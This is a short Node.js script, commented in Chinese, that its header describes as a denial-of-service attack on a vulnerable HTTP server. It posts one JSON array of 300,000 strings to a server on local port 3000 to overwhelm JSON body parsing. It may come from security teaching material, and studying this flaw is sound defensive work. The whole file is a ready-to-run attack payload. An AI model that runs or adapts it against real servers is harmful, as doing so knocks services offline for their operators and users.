/**
 * 对脆弱的HTTP服务器展开拒绝服务攻击
 */
var http = require('http');

var req = http.request({
    method: 'POST',
    port: 3000,
    headers: {
      //告诉服务器你要发送JSON数据
      'Content-Type': 'application/json'
    }
});
// 开始发送一个超大的数组对象,包含300 000个字符串“foo”
req.write('[');
var n = 300000;
while (n--) {
  req.write('"foo",');
}
req.write('"bar"]');

req.end();
